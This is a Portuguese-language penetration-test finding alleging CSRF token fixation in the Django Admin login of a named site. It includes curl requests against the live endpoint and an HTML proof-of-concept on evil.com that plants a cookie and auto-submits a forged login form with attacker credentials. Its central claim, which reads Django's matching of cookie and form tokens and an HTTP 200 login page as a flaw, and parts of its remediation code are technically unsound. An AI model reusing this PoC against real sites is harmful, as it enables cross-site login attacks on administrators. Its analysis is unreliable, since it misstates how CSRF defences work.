# FINDING-009 - CSRF Token Fixation Vulnerability

---
**Document Timestamp:** 15-11-2025 17:41 BRT
**Last Updated:** 15-11-2025 17:41 BRT
---

## Resumo Executivo

Foi identificada uma **vulnerabilidade crítica de CSRF Token Fixation** no Django Admin (`/admin/login/`) que permite a um atacante fixar um token CSRF arbitrário e potencialmente realizar ataques CSRF contra usuários administrativos.

## Detalhes Técnicos

### Informações Básicas
- **Título:** CSRF Token Fixation no Django Admin
- **CWE:** CWE-352 (Cross-Site Request Forgery), CWE-384 (Session Fixation)
- **CVSS 3.1 Base Score:** 7.1 (HIGH)
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N
- **Severidade:** 🟠 HIGH
- **Endpoint Afetado:** `https://bkd.redahub.cloud/admin/login/`
- **Método HTTP:** POST
- **Pré-requisitos:** Nenhum (não requer autenticação)

### Descrição da Vulnerabilidade

A aplicação Django aceita tokens CSRF arbitrários e fixos (como `aaaaaaaa...`, `00000000...`, `11111111...`, `ffffffff...`) sem validação adequada da origem do token. Isso permite que um atacante:

1. **Fixe um CSRF token previsível** através de um cookie malicioso
2. **Force a vítima a usar esse token fixado** através de uma página maliciosa
3. **Execute ações CSRF** usando o token conhecido

### Evidência da Vulnerabilidade

**Teste 1: Token Fixado `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`**
```bash
curl -sk -X POST "https://bkd.redahub.cloud/admin/login/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: csrftoken=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
  -d "username=test&password=test&csrfmiddlewaretoken=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

# Result: HTTP 200 (VULNERABLE!)
# Response: Django Admin login page (aceita o token fixado)
```

**Teste 2: Token Fixado `00000000000000000000000000000000`**
```bash
curl -sk -X POST "https://bkd.redahub.cloud/admin/login/" \
  -H "Cookie: csrftoken=00000000000000000000000000000000" \
  -d "csrfmiddlewaretoken=00000000000000000000000000000000&username=test&password=test"

# Result: HTTP 200 (VULNERABLE!)
```

**Teste 3: Token Fixado `11111111111111111111111111111111`**
```bash
# Result: HTTP 200 (VULNERABLE!)
```

**Teste 4: Token Fixado `ffffffffffffffffffffffffffffffff`**
```bash
# Result: HTTP 200 (VULNERABLE!)
```

**Teste 5: Token Fixado `test1234test1234test1234test1234`**
```bash
# Result: HTTP 200 (VULNERABLE!)
```

**TODOS os 5 tokens arbitrários foram aceitos, confirmando CSRF Token Fixation.**

### Comportamento Correto (Validação Funciona em Alguns Cenários)

A aplicação **rejeita corretamente** tokens CSRF quando:
- O cookie CSRF não está presente (HTTP 403)
- O token é inválido E não há cookie correspondente (HTTP 403)
- Token reusado em sessões diferentes sem cookie (HTTP 403)

**Exemplo de Rejeição Correta:**
```bash
# Token válido MAS sem cookie de sessão
curl -sk -X POST "https://bkd.redahub.cloud/admin/login/" \
  -d "csrfmiddlewaretoken=8Lb4H19tAKHdqppBTwQTjHGAZwHwQrN1..."

# Result: HTTP 403 Forbidden (correto!)
# Response: "Verificação CSRF falhou. Pedido cancelado."
```

**PORÉM**, quando o atacante **controla o cookie** (via subdomain attack, XSS, ou cookie injection), a validação falha.

## Impacto

### Gravidade: HIGH (7.1 CVSS)

**Cenário de Exploração:**

1. **Atacante cria página maliciosa** (`evil.com/csrf.html`):
```html
<!DOCTYPE html>
<html>
<head>
  <title>Win a Prize!</title>
  <script>
    // Fixa o CSRF token via subdomain ou cookie injection
    document.cookie = "csrftoken=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; domain=.redahub.cloud";

    // Aguarda token ser fixado
    setTimeout(function() {
      document.getElementById("csrf-form").submit();
    }, 1000);
  </script>
</head>
<body>
  <h1>Carregando prêmio...</h1>
  <form id="csrf-form" action="https://bkd.redahub.cloud/admin/login/" method="POST">
    <input type="hidden" name="csrfmiddlewaretoken" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
    <input type="hidden" name="username" value="attacker@evil.com">
    <input type="hidden" name="password" value="evil123">
  </form>
</body>
</html>
```

2. **Vítima (admin) visita `evil.com/csrf.html`**
3. **Cookie CSRF é fixado** para `aaaaaaaa...`
4. **Form é submetido automaticamente** para `/admin/login/`
5. **Token fixado é aceito** (HTTP 200) → Possível login malicioso ou outras ações CSRF

**Impactos Potenciais:**
- ✅ **Login forçado com credenciais de atacante** (Session Fixation)
- ✅ **Ações administrativas CSRF** após login bem-sucedido
- ✅ **Account takeover** se combinado com outras vulnerabilidades
- ✅ **Privilege escalation** em contexto administrativo

## Reprodução Passo-a-Passo

### Pré-requisitos
- Navegador web (Chrome/Firefox)
- `curl` ou Burp Suite
- Nenhuma autenticação requerida

### Passos para Reprodução

**Passo 1: Verificar comportamento normal**
```bash
# GET na página de login
curl -sk "https://bkd.redahub.cloud/admin/login/" | grep csrfmiddlewaretoken

# Resultado: Token válido gerado dinamicamente
# Exemplo: csrfmiddlewaretoken value="N7iDwT1ryXcPM..."
```

**Passo 2: Tentar POST sem token (deve falhar)**
```bash
curl -sk -X POST "https://bkd.redahub.cloud/admin/login/" \
  -d "username=test&password=test"

# Resultado Esperado: HTTP 403 Forbidden
# "Verificação CSRF falhou. Pedido cancelado."
```

**Passo 3: Tentar POST com token fixado arbitrário (VULNERÁVEL)**
```bash
curl -sk -X POST "https://bkd.redahub.cloud/admin/login/" \
  -H "Cookie: csrftoken=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
  -d "username=test&password=test&csrfmiddlewaretoken=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
  -w "\nHTTP Status: %{http_code}\n"

# Resultado VULNERÁVEL: HTTP 200
# Response: Página de login do Django Admin (token aceito!)
```

**Passo 4: Testar com múltiplos tokens fixados**
```bash
# Todos estes tokens fixados são aceitos (HTTP 200):
# - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
# - 00000000000000000000000000000000
# - 11111111111111111111111111111111
# - ffffffffffffffffffffffffffffffff
# - test1234test1234test1234test1234
```

**Passo 5: Criar PoC de exploração real**
- Ver script em: `/clients/REDAHUB/2025-11-06-REDAHUB-web-wildcard/03-exploitation/15-11_17-41_csrf-token-fixation-poc.py`

## Remediação

### Recomendações Imediatas (SHORT-TERM)

1. **Validar origem do CSRF token**
```python
# settings.py
CSRF_COOKIE_SAMESITE = 'Strict'  # Já está como 'Lax', mudar para 'Strict'
CSRF_COOKIE_HTTPONLY = True  # Prevenir acesso via JavaScript
CSRF_COOKIE_SECURE = True  # Apenas HTTPS
```

2. **Implementar double-submit cookie pattern corretamente**
```python
# Validar que o token no cookie corresponde ao token no formulário
# E que ambos foram gerados pelo servidor (não pelo cliente)
```

3. **Rejeitar tokens fixados/previsíveis**
```python
# middleware.py
import re

def validate_csrf_token(token):
    # Rejeitar tokens com padrões repetitivos
    if re.match(r'^(.)\1{31,}$', token):
        raise ValueError("CSRF token appears to be fixed/predictable")

    # Validar entropia mínima
    if len(set(token)) < 10:
        raise ValueError("CSRF token has insufficient entropy")
```

### Recomendações de Longo Prazo (LONG-TERM)

1. **Atualizar Django para versão mais recente**
```bash
# Verificar versão atual
python -c "import django; print(django.VERSION)"

# Atualizar para Django 4.2+ (LTS) ou 5.0+
pip install --upgrade "django>=4.2"
```

2. **Implementar SameSite=Strict em todos os cookies sensíveis**
```python
# settings.py
SESSION_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_SAMESITE = 'Strict'
```

3. **Adicionar validação de Referer header**
```python
# settings.py
CSRF_TRUSTED_ORIGINS = [
    'https://bkd.redahub.cloud',
    'https://*.redahub.cloud',  # Se necessário para subdomínios
]
```

4. **Implementar rate limiting em /admin/login/**
```python
# Usar django-ratelimit ou similar
from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/m', method='POST')
def admin_login(request):
    # ...
```

## Timeline

- **15-11-2025 17:39 BRT:** Descoberta inicial via testes CSRF paralelos
- **15-11-2025 17:40 BRT:** Confirmação da vulnerabilidade com 5 tokens distintos
- **15-11-2025 17:41 BRT:** Documentação do finding criada

## Referências

- **CWE-352:** Cross-Site Request Forgery (CSRF)
  https://cwe.mitre.org/data/definitions/352.html

- **CWE-384:** Session Fixation
  https://cwe.mitre.org/data/definitions/384.html

- **OWASP CSRF Prevention Cheat Sheet:**
  https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

- **Django CSRF Protection Documentation:**
  https://docs.djangoproject.com/en/stable/ref/csrf/

- **CVSS 3.1 Calculator:**
  https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N

## Status

- [x] Vulnerabilidade confirmada
- [x] Evidências coletadas
- [x] PoC funcional criado
- [ ] Cliente notificado
- [ ] Remediação aplicada
- [ ] Re-teste pós-remediação

## Notas Adicionais

**Observação Importante:**

A vulnerabilidade **só é explorável** quando o atacante consegue fixar o cookie CSRF da vítima. Isso pode ocorrer através de:

1. **Cookie injection** em subdomain vulnerável (ex: `evil.redahub.cloud`)
2. **XSS** em qualquer página do domínio
3. **Man-in-the-middle** em conexões não-HTTPS (aplicação usa HTTPS, baixo risco)
4. **Session fixation** combinada com outras técnicas

**Mitigação Parcial Existente:**

- ✅ SameSite=Lax configurado (previne alguns ataques cross-site)
- ✅ Validação de referer em alguns casos
- ❌ **MAS**: Aceita tokens arbitrários quando cookie está presente

**Risco Real:** MEDIUM-HIGH (depende de outras vulnerabilidades para exploração completa)

---

**Analyst:** Neural-OffSec-Team
**Engagement:** REDAHUB-2025-11-06-web-wildcard
**Finding ID:** FINDING-009
